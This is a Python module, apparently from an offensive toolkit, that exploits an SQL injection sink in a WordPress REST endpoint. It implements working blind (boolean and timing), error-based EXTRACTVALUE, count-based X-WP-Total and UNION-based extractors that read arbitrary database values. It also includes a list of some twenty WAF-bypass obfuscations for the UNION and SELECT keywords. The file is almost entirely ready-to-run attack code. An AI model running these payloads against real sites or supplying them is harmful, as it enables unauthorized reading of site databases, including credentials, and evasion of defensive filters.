"""Blind SQL injection oracles and a string extractor over the route-confusion sink.

The injected value lands inside the query as:

    ... post_author NOT IN (<value>) ...

so a value of ``0) <sql>-- -`` closes the IN() list and appends arbitrary SQL.
"""

from __future__ import annotations

import html
import re
import statistics
from dataclasses import dataclass
from typing import Callable, Optional, Tuple

from .client import BatchClient

_MIN_PRINTABLE = 32
_MAX_PRINTABLE = 126


@dataclass
class TimingConfirmation:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: Tuple[Tuple[float, float], ...]


class BlindSQLi:
    def __init__(self, client: BatchClient, *, sleep: float = 3.0) -> None:
        self.client = client
        self.sleep = sleep
        self.requests = 0

    def confirm_boolean(self) -> bool:
        """Confirm injectability with a boolean condition pair.

        Sends two requests: one with a tautology (1=1, always matches rows) and one with a
        contradiction (1=0, never matches). If X-WP-Total differs between them, the condition
        is being evaluated — SQLi confirmed. Works even when SLEEP() is WAF-filtered.
        """
        true_count = self.client.match_count(self.client.inject("-1) AND (1=1)-- -"))
        false_count = self.client.match_count(self.client.inject("-1) AND (1=0)-- -"))
        self.requests += 2
        if true_count is None or false_count is None:
            return False
        return true_count != false_count

    def confirm_timing(self, *, samples: int = 3) -> TimingConfirmation:
        """Confirm injectability with paired timing samples.

        Network jitter makes a single baseline/delayed pair brittle, so this alternates
        baseline and delayed requests and compares median paired deltas.
        """
        if samples < 1:
            raise ValueError("samples must be at least 1")

        pairs = []
        for _ in range(samples):
            baseline = self._elapsed("SLEEP(0)")
            delayed = self._elapsed(f"SLEEP({self.sleep:g})")
            pairs.append((baseline, delayed))

        baselines = [pair[0] for pair in pairs]
        delayed = [pair[1] for pair in pairs]
        deltas = [delay - base for base, delay in pairs]
        baseline_median = statistics.median(baselines)
        delayed_median = statistics.median(delayed)
        delta_median = statistics.median(deltas)
        threshold = max(0.75, self.sleep * 0.65)
        confirmed = delta_median >= threshold
        return TimingConfirmation(
            confirmed=confirmed,
            baseline=baseline_median,
            delayed=delayed_median,
            delta=delta_median,
            threshold=threshold,
            samples=tuple(pairs),
        )

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        """Read a string-valued SQL expression one character at a time (binary search)."""
        chars = []
        for position in range(1, max_length + 1):
            # COALESCE keeps a NULL result from short-circuiting into an empty read.
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{position},1))"
            if not self._true(f"{probe} > 0"):
                break
            low, high = _MIN_PRINTABLE, _MAX_PRINTABLE
            while low < high:
                mid = (low + high) // 2
                if self._true(f"{probe} > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            chars.append(chr(low))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        """Read an integer-valued SQL expression.

        Raises ValueError when the extracted text is not an integer, so a
        failed extraction cannot be mistaken for a real count of zero.
        """
        text = self.extract(expression).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _elapsed(self, sql: str) -> float:
        # Wrap in an uncorrelated derived table so the expression executes exactly once,
        # not once per matched row (per-row SLEEP multiplies by row count and can exceed timeout).
        self.requests += 1
        return self.client.inject(f"0) AND (SELECT 1 FROM (SELECT {sql})x)-- -").elapsed

    def _true(self, condition: str) -> bool:
        # Read X-WP-Total, not the body: the item-route source sends no `page`, so get_items() can
        # paginate to an empty body even when rows match. `NOT IN (-1)` matches every post.
        self.requests += 1
        count = self.client.match_count(self.client.inject(f"-1) AND ({condition})-- -"))
        if count is None:
            raise RuntimeError("blind SQLi oracle did not return X-WP-Total")
        return count > 0


class ErrorBasedSQLi:
    """In-band error-based extractor for targets that echo MySQL errors in the response.

    When the target shows database errors (``WP_DEBUG_DISPLAY`` on, or ``$wpdb->show_errors``),
    ``EXTRACTVALUE()`` leaks a value inside an ``XPATH syntax error`` message that is reflected in
    the batch response body. This reads a whole ~15-byte chunk per request instead of one bit per
    request, so it is far faster than the blind binary search, while reaching the same sink. It is
    still strictly read-only.

    Values are pulled out HEX-encoded so the transport is binary-safe (no quote/entity/newline
    surprises and no dependence on the value's character set).
    """

    # EXTRACTVALUE reports up to 32 chars of the offending string; 0x7e ('~') marks our data.
    _HEX_RE = re.compile(r"XPATH syntax error: '~([0-9A-Fa-f]*)")
    _STR_RE = re.compile(r"XPATH syntax error: '~([^']*)")
    _CHUNK = 15  # bytes per request -> 30 hex chars -> '~' + 30 = 31 < 32-char error cap

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0

    def available(self) -> bool:
        """Return True if the target reflects EXTRACTVALUE errors (error-based is usable)."""
        return self._leak_hex("SELECT 0x414243") == b"ABC"  # 'ABC'

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 256,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        length_text = self._leak_str(f"SELECT LENGTH(COALESCE(({expression}),''))")
        if length_text is None or not length_text.strip().isdigit():
            return ""
        length = min(int(length_text.strip()), max_length)

        out = bytearray()
        offset = 1
        while offset <= length:
            chunk = self._leak_hex(
                f"SELECT SUBSTRING(COALESCE(({expression}),''),{offset},{self._CHUNK})"
            )
            if not chunk:
                break
            out.extend(chunk)
            offset += len(chunk)
            if on_char:
                on_char(out.decode("utf-8", "replace"))
            if len(chunk) < self._CHUNK:
                break
        return out.decode("utf-8", "replace")

    def integer(self, expression: str) -> int:
        text = (self._leak_str(f"SELECT ({expression})") or "").strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _leak_hex(self, expression: str) -> Optional[bytes]:
        text = self._send(f"HEX(({expression}))")
        match = self._HEX_RE.search(text)
        if not match:
            return None
        digits = match.group(1)
        if len(digits) % 2:  # defensive: drop a half-byte if the error truncated mid-pair
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits)
        except ValueError:
            return None

    def _leak_str(self, expression: str) -> Optional[str]:
        text = self._send(f"({expression})")
        match = self._STR_RE.search(text)
        return match.group(1) if match else None

    def _send(self, inner: str) -> str:
        self.requests += 1
        payload = f"0) OR EXTRACTVALUE(1,CONCAT(0x7e,{inner}))-- -"
        return html.unescape(self.client.inject(payload).body)


class CountBasedSQLi:
    """Fast extractor that encodes ASCII values into X-WP-Total via conditional UNION rows.

    Technique (47Cid / wp2shell-lab approach):
    - For each character position, inject 7 conditional UNION rows — one per ASCII bit 0-6.
    - Each row appears in the result set only when its corresponding bit of ASCII(char) is set.
    - X-WP-Total − baseline = sum of set-bit weights = ASCII value. One request per character
      vs. ~7 for binary-search blind.

    Requires: target uses SQL_CALC_FOUND_ROWS (not a separate COUNT(*)) for X-WP-Total.
    This holds when no persistent object cache (Redis/Memcached) is active. When object cache
    is present WordPress issues a separate COUNT(*) query that bypasses the UNION injection,
    making X-WP-Total always return the real post count — available() detects this and returns
    False, causing auto-selection to fall back to BlindSQLi.

    Uses union_inject() (orderby=none path) to avoid ORDER BY breaking the UNION syntax.
    """

    # Spacing between bit-sentinel IDs to avoid collision with real post IDs.
    _BIT_ID_BASE = 2_000_000_000

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0
        self._baseline: Optional[int] = None

    def _get_total(self, payload: str) -> Optional[int]:
        # Use union_inject() so orderby=none removes ORDER BY (UNION fails with ORDER BY).
        # match_count() reads X-WP-Total from the inner batch response — this comes from
        # SQL_CALC_FOUND_ROWS in the first-phase ID query, which counts UNION rows even when
        # the object cache prevents them from appearing in the body.
        self.requests += 1
        return self.client.match_count(self.client.union_inject(payload))

    def _baseline_count(self) -> int:
        """Fetch baseline X-WP-Total with a no-op injection (no extra UNION rows)."""
        if self._baseline is None:
            self._baseline = self._get_total("0")
        return self._baseline or 0

    def available(self) -> bool:
        """Return True if the count oracle can distinguish bit values.

        Injects a single forced UNION row and checks that X-WP-Total increases by 1.
        Works even when body-reflection UNION fails (object cache).
        """
        base = self._baseline_count()
        # Force exactly one extra row with a tautology condition.
        row = self._one_bit_row(0, "1=1")
        total = self._get_total(f"0) UNION ALL SELECT {row}-- -")
        if total is None:
            return False
        return total == base + 1

    def _one_bit_row(self, bit_idx: int, condition: str) -> str:
        """Build a UNION SELECT row that is counted only when `condition` is true.

        Uses NULL for all columns except ID (to satisfy wp_posts schema minimally).
        The fake ID uses a sentinel base so it never collides with real post IDs.
        Uses FROM DUAL WHERE so the row only appears in the result set when condition is non-zero.
        """
        fake_id = self._BIT_ID_BASE + bit_idx
        # wp_posts has 23 columns; only ID (col 0) matters for the ID-phase SELECT.
        nulls = ["NULL"] * 23
        nulls[0] = str(fake_id)
        cols = ",".join(nulls)
        return f"{cols} FROM DUAL WHERE ({condition})"

    def _read_char(self, expression: str, position: int) -> Optional[str]:
        """Read one character at `position` (1-based) from `expression` in a single request.

        Encodes ASCII value into X-WP-Total by injecting (1<<bit) rows conditionally for each bit.
        Bit 0 → 1 row if set, bit 1 → 2 rows if set, bit 2 → 4 rows ... bit 6 → 64 rows.
        X-WP-Total - baseline = sum of set bits weighted by power of 2 = ASCII value.
        """
        probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{position},1))"
        # Build weighted conditional rows for bits 0-6 (covers printable ASCII 32-127).
        all_rows: list[str] = []
        for bit in range(7):
            weight = 1 << bit   # number of rows to inject for this bit
            condition = f"({probe}) & {weight}"
            # Cumulative replica count before this bit group: sum(2^0 + 2^1 + ... + 2^(bit-1)) = 2^bit - 1.
            # This gives each bit group a non-overlapping range of IDs:
            #   bit 0 → offset 0       (1 row)
            #   bit 1 → offsets 1-2    (2 rows)
            #   bit 2 → offsets 3-6    (4 rows)  ... etc.
            bit_base = (1 << bit) - 1
            for replica in range(weight):
                all_rows.append(f"SELECT {self._one_bit_row(bit_base + replica, condition)}")
        rows_sql = " UNION ALL ".join(all_rows)
        payload = f"0) UNION ALL {rows_sql}-- -"
        total = self._get_total(payload)
        if total is None:
            return None
        base = self._baseline_count()
        ascii_val = total - base
        if ascii_val <= 0:
            return None   # end of string
        return chr(ascii_val)

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        """Extract a string expression one character per request via count oracle."""
        chars: list[str] = []
        for position in range(1, max_length + 1):
            ch = self._read_char(expression, position)
            if ch is None or ch == "\x00":
                break
            chars.append(ch)
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        text = self.extract(expression).strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected integer from {expression!r}, got {text!r}")
        return int(text)


# WAF bypass transforms applied to the UNION…SELECT keyword pair.
# Each entry is (union_kw, select_kw) — they replace the literal words in the payload.
# Ordered from least to most obfuscated so the simplest working bypass is preferred.
# Sources: sqlmap tamper scripts, PayloadsAllTheThings, OWASP WAF bypass research.
_UNION_BYPASSES: list[tuple[str, str]] = [
    ("UNION",              "SELECT"),           # plain — baseline
    ("UNION ALL",          "SELECT"),           # ALL keyword; bypasses rules matching exact "UNION SELECT"
    ("UNION",              "/*!SELECT*/"),      # MySQL executable comment on SELECT
    ("/*!UNION*/",         "SELECT"),           # MySQL executable comment on UNION
    ("/*!UNION*/",         "/*!SELECT*/"),      # both wrapped in executable comments
    ("/*!0UNION*/",        "/*!0SELECT*/"),     # zero-versioned; executes on all MySQL versions
    ("/*!00000UNION*/",    "/*!00000SELECT*/"), # 5-digit zero-version (ModSecurity bypass)
    ("/*!50000UNION*/",    "/*!50000SELECT*/"), # high-version executable comment
    ("UNION/**/",          "SELECT"),           # C-style comment as whitespace
    ("UNION/**/",          "/**/SELECT"),       # comment both sides
    ("UNION%0a",           "SELECT"),           # URL-encoded newline
    ("UNION%09",           "SELECT"),           # URL-encoded tab
    ("UNION%0b",           "SELECT"),           # vertical tab
    ("UNION%0c",           "SELECT"),           # form feed
    ("UNION%0d%0a",        "SELECT"),           # CRLF
    ("UNION%0a%23x%0a",    "SELECT"),           # newline + line-comment + newline
    ("UN/**/ION",          "SE/**/LECT"),       # comments splitting keywords
    ("U/**/NI/**/ON",      "S/**/EL/**/ECT"),   # heavy comment splitting
    ("UnIoN",              "SeLeCt"),           # case randomization
    ("UNunionION",         "SEselectLECT"),     # double-nest (exploits WAF strip-then-pass logic)
    ("%55NION",            "%53ELECT"),         # URL hex-encode first letter (U→%55, S→%53)
]


class UnionSQLi:
    """In-band UNION extractor: forges a fake ``WP_Post`` row and reads its reflected title.

    Uses the single-post-route confusion (see ``BatchClient.union_inject``) to reach a non-split,
    no-``ORDER BY`` posts query, then ``UNION SELECT``s a full ``wp_posts.*`` row whose
    ``post_title`` carries ``||HEX(value)||``. The forged post is returned in the REST collection
    response, so a whole value comes back in a single request — no blind search, no reliance on
    reflected DB errors. This also demonstrates the fake-``WP_Post`` object-cache poisoning
    primitive (the row is added to the ``posts`` cache for the rest of the request). Read only.
    """

    _COLUMNS = 23  # wp_posts column count (stable across modern WordPress)
    _TITLE_COL = 6  # post_title is rendered back in the REST response
    _RE = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")
    # 'publish' / 'post' / a valid datetime keep the forged row a readable, renderable post.
    _PUBLISH = "0x7075626c697368"
    _POST = "0x706f7374"
    _DATE = "0x323032302d30312d30312030303a30303a3030"

    def __init__(self, client: BatchClient) -> None:
        self.client = client
        self.requests = 0
        self._bypass: Optional[tuple[str, str]] = None  # cached working bypass

    def _apply_bypass(self, payload: str, bypass: tuple[str, str]) -> str:
        union_kw, select_kw = bypass
        return payload.replace("UNION", union_kw, 1).replace("SELECT", select_kw, 1)

    def _probe_bypass(self) -> bool:
        """Try each WAF bypass in order; cache and return True when one works."""
        for bypass in _UNION_BYPASSES:
            raw = f"0) UNION SELECT {self._columns('SELECT 0x4f4b')}-- -"
            payload = self._apply_bypass(raw, bypass)
            self.requests += 1
            response = self.client.union_inject(payload)
            match = self._RE.search(response.body)
            if match:
                digits = match.group(1)
                if len(digits) % 2:
                    digits = digits[:-1]
                try:
                    if bytes.fromhex(digits).decode("utf-8", "replace") == "OK":
                        self._bypass = bypass
                        return True
                except ValueError:
                    pass
        return False

    def available(self) -> bool:
        """Return True if the target reflects a UNION-forged post (union extraction is usable).

        Also probes for WAF bypass variants — if plain UNION fails but an obfuscated form works,
        that variant is cached and used for all subsequent extractions.
        """
        if self._bypass is not None:
            return True
        return self._probe_bypass()

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 0,  # accepted for interface parity; a UNION reads the whole value at once
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        value = self._read(expression)
        if value and on_char:
            on_char(value)
        return value or ""

    def integer(self, expression: str) -> int:
        text = (self._read(f"SELECT ({expression})") or "").strip()
        if not text.lstrip("-").isdigit():
            raise ValueError(f"expected an integer from {expression!r}, got {text!r}")
        return int(text)

    def _read(self, expression: str) -> Optional[str]:
        self.requests += 1
        raw = f"0) UNION SELECT {self._columns(expression)}-- -"
        bypass = self._bypass or (_UNION_BYPASSES[0])
        payload = self._apply_bypass(raw, bypass)
        response = self.client.union_inject(payload)
        match = self._RE.search(response.body)
        if not match:
            return None
        digits = match.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def _columns(self, expression: str) -> str:
        columns = []
        for index in range(1, self._COLUMNS + 1):
            if index == 1:
                columns.append("999999")  # ID (fake, unused post id)
            elif index in (3, 4, 15, 16):
                columns.append(self._DATE)  # post_date / *_gmt / post_modified / *_gmt
            elif index == self._TITLE_COL:
                columns.append(f"CONCAT(0x7c7c,HEX(CAST(({expression})AS CHAR)),0x7c7c)")
            elif index == 8:
                columns.append(self._PUBLISH)  # post_status
            elif index == 21:
                columns.append(self._POST)  # post_type
            else:
                columns.append(str(index))
        return ",".join(columns)
